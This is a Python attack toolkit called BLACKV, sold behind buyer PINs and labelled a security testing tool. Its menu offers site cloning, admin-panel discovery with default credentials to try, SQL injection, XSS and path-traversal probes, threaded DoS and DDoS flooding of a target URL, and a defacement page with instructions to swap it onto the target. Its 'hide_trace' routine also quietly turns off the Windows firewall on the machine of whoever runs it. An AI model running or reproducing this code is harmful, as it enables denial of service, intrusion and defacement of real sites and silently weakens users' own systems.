#!/usr/bin/env python3
# BLACKV - Security Testing Tool
# Version 2.0
# Developer: Cozy
# Date: 12/6/2026

import os
import sys
import time
import json
import base64
import hashlib
import requests
import threading
import socket
import random
import urllib.parse
from urllib.parse import urlparse
from datetime import datetime
import ssl

os.system('title BLACKV TOOL')
os.system('mode con: cols=120 lines=35')

LANG = "ENG"
TEXTS = {
    "ENG": {
        "banner": "SECURITY TESTING TOOL",
        "version": "VERSION 2.0",
        "dev": "DEVELOPER: COZY",
        "date": "DATE: 12/6/2026",
        "access": "ACCESS CONTROL SYSTEM",
        "buyer": "BUYER ACCESS",
        "dev_access": "DEVELOPER ACCESS",
        "exit": "EXIT",
        "select": "SELECT",
        "enter_pin": "ENTER PIN",
        "granted": "ACCESS GRANTED",
        "denied": "ACCESS DENIED",
        "main_menu": "MAIN MENU",
        "menu1": "COPY ALL WEBSITE",
        "menu2": "CHECK ADMIN AUTH LOGIN AND PASSWORD",
        "menu3": "CHECK BUGS - BUG HUNTER MODE",
        "menu4": "DDOS ATTACK",
        "menu5": "DOS ATTACK",
        "menu6": "XML - MODIFY WEBSITE",
        "menu7": "CREDIT AND INFO",
        "menu8": "CHANGE LANGUAGE",
        "menu9": "EXIT",
        "target_url": "TARGET URL",
        "attack_count": "ATTACK COUNT",
        "max_200": "MAX 200",
        "max_100": "MAX 100",
        "message": "MESSAGE",
        "title": "TITLE",
        "press_enter": "PRESS ENTER TO CONTINUE",
        "invalid": "INVALID OPTION",
        "success": "SUCCESS",
        "error": "ERROR",
        "complete": "COMPLETE",
        "found": "FOUND",
        "scanning": "SCANNING",
        "processing": "PROCESSING"
    },
    "IND": {
        "banner": "ALAT PENGUJIAN KEAMANAN",
        "version": "VERSI 2.0",
        "dev": "PENGEMBANG: COZY",
        "date": "TANGGAL: 12/6/2026",
        "access": "SISTEM KONTROL AKSES",
        "buyer": "AKSES PEMBELI",
        "dev_access": "AKSES PENGEMBANG",
        "exit": "KELUAR",
        "select": "PILIH",
        "enter_pin": "MASUKKAN PIN",
        "granted": "AKSES DIBERIKAN",
        "denied": "AKSES DITOLAK",
        "main_menu": "MENU UTAMA",
        "menu1": "SALIN SEMUA WEBSITE",
        "menu2": "CEK AUTH LOGIN ADMIN DAN PASSWORD",
        "menu3": "CEK BUG - MODE BUG HUNTER",
        "menu4": "SERANGAN DDOS",
        "menu5": "SERANGAN DOS",
        "menu6": "XML - UBAH WEBSITE",
        "menu7": "KREDIT DAN INFO",
        "menu8": "UBAH BAHASA",
        "menu9": "KELUAR",
        "target_url": "URL TARGET",
        "attack_count": "JUMLAH SERANGAN",
        "max_200": "MAX 200",
        "max_100": "MAX 100",
        "message": "PESAN",
        "title": "JUDUL",
        "press_enter": "TEKAN ENTER UNTUK LANJUT",
        "invalid": "PILIHAN TIDAK VALID",
        "success": "BERHASIL",
        "error": "GAGAL",
        "complete": "SELESAI",
        "found": "DITEMUKAN",
        "scanning": "MEMINDAI",
        "processing": "MEMPROSES"
    }
}

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def t(key):
    return TEXTS[LANG].get(key, key)

def encrypt(text, key=281535):
    result = []
    for i, char in enumerate(text):
        key_byte = (key + i) % 256
        result.append(chr(ord(char) ^ key_byte))
    return base64.b64encode(''.join(result).encode()).decode()

def decrypt(encrypted, key=281535):
    try:
        decoded = base64.b64decode(encrypted).decode()
        result = []
        for i, char in enumerate(decoded):
            key_byte = (key + i) % 256
            result.append(chr(ord(char) ^ key_byte))
        return ''.join(result)
    except:
        return ""

def hide_trace():
    if os.name == 'nt':
        try:
            os.system('netsh advfirewall set allprofiles state off > nul 2>&1')
        except:
            pass

def banner():
    clear()
    hide_trace()
    print("""
██████╗ ██╗      █████╗  ██████╗██╗  ██╗██╗   ██╗
██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██║   ██║
██████╔╝██║     ███████║██║     █████╔╝ ██║   ██║
██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ╚██╗ ██╔╝
██████╔╝███████╗██║  ██║╚██████╗██║  ██╗ ╚████╔╝ 
╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝  ╚═══╝  
                                                  
          {banner}
          {version}
          {dev}
          {date}
    """.format(
        banner=t("banner"),
        version=t("version"),
        dev=t("dev"),
        date=t("date")
    ))

def choose_language():
    global LANG
    clear()
    print("\n" + "="*50)
    print("SELECT LANGUAGE / PILIH BAHASA")
    print("="*50)
    print("[1] ENGLISH")
    print("[2] INDONESIA")
    choice = input("\nSELECT: ")
    if choice == "2":
        LANG = "IND"
    else:
        LANG = "ENG"

def check_pin():
    global LANG
    while True:
        banner()
        print(f"\n[{t('access')}]")
        print(f"[1] {t('buyer')}")
        print(f"[2] {t('dev_access')}")
        print(f"[3] {t('exit')}")
        
        choice = input(f"\n{t('select')}: ")
        
        if choice == '1':
            pin = input(f"{t('enter_pin')}: ")
            if pin == "281235":
                print(f"\n[{t('granted')}]")
                time.sleep(1)
                return "buyer"
            else:
                print(f"\n[{t('denied')}]")
                time.sleep(2)
        elif choice == '2':
            pin = input(f"{t('enter_pin')}: ")
            if pin == "281535":
                print(f"\n[{t('granted')}]")
                time.sleep(1)
                return "dev"
            else:
                print(f"\n[{t('denied')}]")
                time.sleep(2)
        elif choice == '3':
            sys.exit(0)

def create_report(target, tool, result):
    os.makedirs("reports", exist_ok=True)
    name = target.replace("http://", "").replace("https://", "").replace("/", " ").replace(".", " ")
    filename = f"reports/{name} - {tool}.txt"
    
    with open(filename, "w", encoding="utf-8") as f:
        f.write("BLACKV SECURITY REPORT\n")
        f.write("="*50 + "\n")
        f.write(f"Target: {target}\n")
        f.write(f"Tool: {tool}\n")
        f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("="*50 + "\n")
        f.write(result)
    
    return filename

def menu_1_copy_all():
    banner()
    print(f"\n[1] {t('menu1')}")
    
    url = input(f"\n{t('target_url')}: ").strip()
    if not url.startswith("http"):
        url = "http://" + url
    
    name = url.replace("http://", "").replace("https://", "").replace("/", " ").replace(".", " ")
    
    print(f"\n[{t('processing')}] {url}")
    
    try:
        os.makedirs(f"cloned/{name}", exist_ok=True)
        
        response = requests.get(url, timeout=30, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        
        with open(f"cloned/{name}/index.html", "w", encoding="utf-8") as f:
            f.write(response.text)
        
        import re
        css_links = re.findall(r'href=[\'"]?([^\'" >]+\.css)[\'"]?', response.text)
        js_links = re.findall(r'src=[\'"]?([^\'" >]+\.js)[\'"]?', response.text)
        img_links = re.findall(r'src=[\'"]?([^\'" >]+\.(png|jpg|jpeg|gif|svg))[\'"]?', response.text, re.I)
        
        css_count = 0
        js_count = 0
        img_count = 0
        
        for css in css_links[:50]:
            try:
                if css.startswith("http"):
                    css_url = css
                else:
                    css_url = url.rstrip("/") + "/" + css.lstrip("/")
                css_resp = requests.get(css_url, timeout=10)
                with open(f"cloned/{name}/style_{css_count}.css", "w", encoding="utf-8") as f:
                    f.write(css_resp.text)
                css_count += 1
            except:
                pass
        
        for js in js_links[:50]:
            try:
                if js.startswith("http"):
                    js_url = js
                else:
                    js_url = url.rstrip("/") + "/" + js.lstrip("/")
                js_resp = requests.get(js_url, timeout=10)
                with open(f"cloned/{name}/script_{js_count}.js", "w", encoding="utf-8") as f:
                    f.write(js_resp.text)
                js_count += 1
            except:
                pass
        
        for img in img_links[:50]:
            try:
                img_url = img[0]
                if not img_url.startswith("http"):
                    img_url = url.rstrip("/") + "/" + img_url.lstrip("/")
                img_resp = requests.get(img_url, timeout=10)
                ext = img[1]
                with open(f"cloned/{name}/image_{img_count}.{ext}", "wb") as f:
                    f.write(img_resp.content)
                img_count += 1
            except:
                pass
        
        result = f"COMPLETE: Cloned {url}\nHTML: index.html\nCSS: {css_count} files\nJS: {js_count} files\nIMAGES: {img_count} files\nLocation: cloned/{name}/"
        
        print(f"\n[{t('success')}] HTML saved")
        print(f"[{t('success')}] {css_count} CSS files")
        print(f"[{t('success')}] {js_count} JS files")
        print(f"[{t('success')}] {img_count} images")
        
        create_report(url, "COPY_ALL", result)
        
    except Exception as e:
        print(f"\n[{t('error')}] {str(e)}")
    
    input(f"\n{t('press_enter')}")

def menu_2_admin_auth():
    banner()
    print(f"\n[2] {t('menu2')}")
    
    url = input(f"\n{t('target_url')}: ").strip()
    if not url.startswith("http"):
        url = "http://" + url
    
    name = url.replace("http://", "").replace("https://", "").replace("/", " ").replace(".", " ")
    
    admin_paths = [
        "admin", "login", "administrator", "wp-admin", "admin/login",
        "admin.php", "login.php", "index.php?route=account/login",
        "cpanel", "dashboard", "adminpanel", "auth", "signin",
        "admin/index.html", "admin/login.html", "user/login",
        "member/login", "account/login", "backend", "controlpanel",
        "cp", "panel", "adm", "manage", "manager", "webadmin"
    ]
    
    print(f"\n[{t('scanning')}] {url}")
    print(f"[{t('processing')}] {len(admin_paths)} paths")
    
    found = []
    
    for path in admin_paths:
        try:
            test_url = url.rstrip("/") + "/" + path
            resp = requests.get(test_url, timeout=8, headers={"User-Agent": "Mozilla/5.0"})
            
            if resp.status_code == 200:
                found.append(test_url)
                print(f"[{t('found')}] {test_url}")
            elif resp.status_code in [401, 403]:
                found.append(f"{test_url} (AUTH REQUIRED)")
                print(f"[AUTH] {test_url}")
        except:
            pass
    
    result = f"ADMIN AUTH SCAN RESULTS\nTarget: {url}\nFound: {len(found)} panels\n\n"
    for f in found:
        result += f"- {f}\n"
    
    if found:
        result += "\nCOMMON CREDENTIALS TO TEST:\n- admin:admin\n- admin:password\n- admin:123456\n- root:root\n- administrator:administrator"
    
    print(f"\n[{t('complete')}] {t('found')} {len(found)} admin panels")
    filename = create_report(url, "ADMIN_AUTH", result)
    print(f"[REPORT] {filename}")
    
    input(f"\n{t('press_enter')}")

def menu_3_check_bugs():
    banner()
    print(f"\n[3] {t('menu3')}")
    
    url = input(f"\n{t('target_url')}: ").strip()
    if not url.startswith("http"):
        url = "http://" + url
    
    name = url.replace("http://", "").replace("https://", "").replace("/", " ").replace(".", " ")
    
    print(f"\n[{t('scanning')}] {url}")
    
    vulnerabilities = []
    
    test_urls = [
        f"{url}?id=1'",
        f"{url}?id=1%27",
        f"{url}?q=<script>alert(1)</script>",
        f"{url}/../../../../etc/passwd",
        f"{url}/robots.txt",
        f"{url}/.htaccess",
        f"{url}/backup.zip",
        f"{url}/config.php.bak"
    ]
    
    for test_url in test_urls:
        try:
            resp = requests.get(test_url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
            if resp.status_code == 200:
                if "sql" in resp.text.lower() or "mysql" in resp.text.lower():
                    vulnerabilities.append(f"SQLI: {test_url}")
                if "script" in resp.text.lower():
                    vulnerabilities.append(f"XSS: {test_url}")
                if "root:" in resp.text:
                    vulnerabilities.append(f"LFI: {test_url}")
                if resp.status_code == 200:
                    if "backup" in test_url or "config" in test_url:
                        vulnerabilities.append(f"EXPOSED: {test_url}")
        except:
            pass
    
    admin_paths = ["admin", "login", "wp-admin", "administrator"]
    for path in admin_paths:
        try:
            test_url = url.rstrip("/") + "/" + path
            resp = requests.get(test_url, timeout=10)
            if resp.status_code == 200:
                vulnerabilities.append(f"ADMIN PANEL: {test_url}")
        except:
            pass
    
    result = f"BUG HUNTER SCAN RESULTS\nTarget: {url}\nTotal Vulnerabilities: {len(vulnerabilities)}\n\n"
    for v in vulnerabilities:
        result += f"- {v}\n"
    
    if not vulnerabilities:
        result += "\nNo vulnerabilities found in basic scan"
    
    print(f"\n[{t('complete')}] {t('found')} {len(vulnerabilities)} issues")
    filename = create_report(url, "BUG_HUNTER", result)
    print(f"[REPORT] {filename}")
    
    input(f"\n{t('press_enter')}")

def ddos_attack():
    banner()
    print(f"\n[4] {t('menu4')}")
    
    url = input(f"\n{t('target_url')}: ").strip()
    if not url.startswith("http"):
        url = "http://" + url
    
    try:
        count = int(input(f"{t('attack_count')} (1-200): "))
        if count > 200:
            count = 200
        if count < 1:
            count = 1
    except:
        count = 50
    
    print(f"\n[{t('processing')}] DDOS Attack on {url}")
    print(f"[ATTACK] Sending {count} requests with multiple threads")
    
    parsed = urlparse(url)
    host = parsed.netloc
    path = parsed.path or "/"
    
    def send_request():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((host, 80))
            request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n"
            sock.send(request.encode())
            sock.close()
        except:
            pass
    
    for i in range(count):
        for _ in range(10):
            thread = threading.Thread(target=send_request)
            thread.start()
        time.sleep(0.1)
        print(f"[ATTACK] Sent {min((i+1)*10, count*10)} packets", end="\r")
    
    result = f"DDOS ATTACK COMPLETE\nTarget: {url}\nPackets Sent: {count*10}\nDate: {datetime.now()}"
    create_report(url, "DDOS", result)
    
    print(f"\n\n[{t('success')}] DDOS attack completed")
    input(f"\n{t('press_enter')}")

def dos_attack():
    banner()
    print(f"\n[5] {t('menu5')}")
    
    url = input(f"\n{t('target_url')}: ").strip()
    if not url.startswith("http"):
        url = "http://" + url
    
    try:
        count = int(input(f"{t('attack_count')} (1-100): "))
        if count > 100:
            count = 100
        if count < 1:
            count = 1
    except:
        count = 30
    
    print(f"\n[{t('processing')}] DOS Attack on {url}")
    print(f"[ATTACK] Sending {count} heavy requests")
    
    def send_heavy_request():
        try:
            for _ in range(5):
                requests.get(url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
        except:
            pass
    
    for i in range(count):
        thread = threading.Thread(target=send_heavy_request)
        thread.start()
        print(f"[ATTACK] Request {i+1}/{count} sent", end="\r")
        time.sleep(0.05)
    
    result = f"DOS ATTACK COMPLETE\nTarget: {url}\nRequests Sent: {count*5}\nDate: {datetime.now()}"
    create_report(url, "DOS", result)
    
    print(f"\n\n[{t('success')}] DOS attack completed")
    input(f"\n{t('press_enter')}")

def menu_6_xml():
    banner()
    print(f"\n[6] {t('menu6')}")
    
    url = input(f"\n{t('target_url')}: ").strip()
    if not url.startswith("http"):
        url = "http://" + url
    
    message = input(f"{t('message')}: ")
    title = input(f"{t('title')}: ")
    
    print(f"\n[{t('processing')}] Attempting to modify {url}")
    
    modified_html = f"""<!DOCTYPE html>
<html>
<head><title>{title}</title>
<style>body{{background:black;color:red;text-align:center;padding-top:100px;font-family:monospace;}}</style>
</head>
<body>
<h1>{title}</h1>
<p>{message}</p>
<hr>
<p>Site Modified by BLACKV</p>
</body>
</html>"""
    
    try:
        response = requests.get(url, timeout=10)
        original = response.text
        
        os.makedirs("xml_output", exist_ok=True)
        name = url.replace("http://", "").replace("https://", "").replace("/", " ").replace(".", " ")
        
        with open(f"xml_output/{name}_modified.html", "w", encoding="utf-8") as f:
            f.write(modified_html)
        
        result = f"XML MODIFICATION\nTarget: {url}\nMessage: {message}\nTitle: {title}\nModified HTML saved to xml_output/{name}_modified.html"
        
        print(f"\n[{t('success')}] Modified HTML created")
        print(f"[INFO] To apply: Replace target website HTML with generated file")
        
        create_report(url, "XML", result)
        
    except Exception as e:
        print(f"\n[{t('error')}] {str(e)}")
    
    input(f"\n{t('press_enter')}")

def menu_7_credit():
    banner()
    print(f"\n[7] {t('menu7')}")
    print("="*40)
    print("DEVELOPER: COZY")
    print("DATE: 12/6/2026")
    print("STATUS: BUYER")
    print("VERSION 2.0")
    print("="*40)
    print("\nBLACKV - Security Testing Tool")
    print("For authorized security testing only")
    
    input(f"\n{t('press_enter')}")

def main():
    global LANG
    choose_language()
    
    access_level = None
    while access_level is None:
        access_level = check_pin()
    
    while True:
        banner()
        print(f"\n[{t('main_menu')}]")
        print(f"[1] {t('menu1')}")
        print(f"[2] {t('menu2')}")
        print(f"[3] {t('menu3')}")
        print(f"[4] {t('menu4')}")
        print(f"[5] {t('menu5')}")
        print(f"[6] {t('menu6')}")
        print(f"[7] {t('menu7')}")
        print(f"[8] {t('menu8')}")
        print(f"[9] {t('menu9')}")
        
        choice = input(f"\n{t('select')}: ")
        
        if choice == '1':
            menu_1_copy_all()
        elif choice == '2':
            menu_2_admin_auth()
        elif choice == '3':
            menu_3_check_bugs()
        elif choice == '4':
            ddos_attack()
        elif choice == '5':
            dos_attack()
        elif choice == '6':
            menu_6_xml()
        elif choice == '7':
            menu_7_credit()
        elif choice == '8':
            choose_language()
        elif choice == '9':
            print(f"\n[{t('exit')}]")
            sys.exit(0)
        else:
            print(f"\n[{t('invalid')}]")
            time.sleep(1)

if __name__ == "__main__":
    main()